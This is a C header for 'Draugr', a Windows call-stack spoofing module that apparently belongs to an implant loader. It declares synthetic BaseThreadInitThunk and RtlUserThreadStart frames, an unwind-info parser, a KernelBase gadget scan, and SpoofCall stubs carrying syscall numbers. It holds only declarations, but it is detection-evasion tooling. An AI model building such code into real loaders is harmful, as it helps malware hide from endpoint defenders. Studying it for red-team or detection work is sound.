#pragma once
#include <windows.h>

/* ── Function-pointer struct passed into every Draugr call ─────────────
 * Populated by the caller (loader.c) from DFR-resolved addresses.
 * Only GetProcAddress and GetModuleHandleA are used internally;
 * the rest are present to match eden's layout and for caller convenience. */
typedef struct _IMPORTFUNCS
{
    HMODULE(WINAPI *LoadLibraryA)(LPCSTR lpLibFileName);
    FARPROC(WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
    HMODULE(WINAPI *GetModuleHandleA)(LPCSTR lpModuleName);
    LPVOID(WINAPI *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    BOOL(WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
} IMPORTFUNCS, *PIMPORTFUNCS;

/* ── Unwind helpers ─────────────────────────────────────────────────── */
#define RBP_OP_INFO 0x5
#define maxNumberOfGadgets 15
#define maxNumberOfTries 15

typedef enum _UNWIND_OP_CODES
{
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS;

typedef union _UNWIND_CODE
{
    struct
    {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE_T, *PUNWIND_CODE_T;

typedef struct _UNWIND_INFO_T
{
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE_T UnwindCode[1];
} UNWIND_INFO_T, *PUNWIND_INFO_T;

/* ── Call-stack frame descriptors ───────────────────────────────────── */
typedef struct _FRAME_INFO
{
    PVOID ModuleAddress;
    PVOID FunctionAddress;
    DWORD Offset;
} FRAME_INFO, *PFRAME_INFO;

typedef struct _SYNTHETIC_STACK_FRAME
{
    FRAME_INFO Frame1; /* BaseThreadInitThunk */
    FRAME_INFO Frame2; /* RtlUserThreadStart  */
    PVOID pGadget;     /* base of KernelBase.dll for gadget scan */
} SYNTHETIC_STACK_FRAME, *PSYNTHETIC_STACK_FRAME;

typedef struct _STACK_FRAME
{
    LPCWSTR DllPath;
    ULONG Offset;
    ULONGLONG TotalStackSize;
    BOOL RequiresLoadLibrary;
    BOOL SetsFramePointer;
    PVOID ReturnAddress;
    BOOL PushRbp;
    ULONG CountOfCodes;
    BOOL PushRbpIndex;
} STACK_FRAME, *PSTACK_FRAME;

/* ── DRAUGR_PARAMETERS — live context shared with the fixup stub ────── */
typedef struct _DRAUGR_PARAMETERS
{
    PVOID Fixup;                            /* 0   */
    PVOID OriginalReturnAddress;            /* 8   */
    PVOID Rbx;                              /* 16  */
    PVOID Rdi;                              /* 24  */
    PVOID BaseThreadInitThunkStackSize;     /* 32  */
    PVOID BaseThreadInitThunkReturnAddress; /* 40  */
    PVOID TrampolineStackSize;              /* 48  */
    PVOID RtlUserThreadStartStackSize;      /* 56  */
    PVOID RtlUserThreadStartReturnAddress;  /* 64  */
    PVOID Ssn;                              /* 72  */
    PVOID Trampoline;                       /* 80  */
    PVOID Rsi;                              /* 88  */
    PVOID R12;                              /* 96  */
    PVOID R13;                              /* 104 */
    PVOID R14;                              /* 112 */
    PVOID R15;                              /* 120 */
} DRAUGR_PARAMETERS, *PDRAUGR_PARAMETERS;

/* ── Public API ─────────────────────────────────────────────────────── */
BOOL InitFrameInfo(IMPORTFUNCS *funcs, PSYNTHETIC_STACK_FRAME stackFrame);

PVOID SpoofCall(IMPORTFUNCS *funcs, PSYNTHETIC_STACK_FRAME stackFrame,
                PVOID pFunctionAddr,
                PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4,
                PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8,
                PVOID pArg9, PVOID pArg10, PVOID pArg11, PVOID pArg12);

void *DraugrSpoofStub(PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4,
                      PVOID draugrParameters, PVOID pFunctionAddr, int size,
                      PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8,
                      PVOID pArg9, PVOID pArg10, PVOID pArg11, PVOID pArg12);
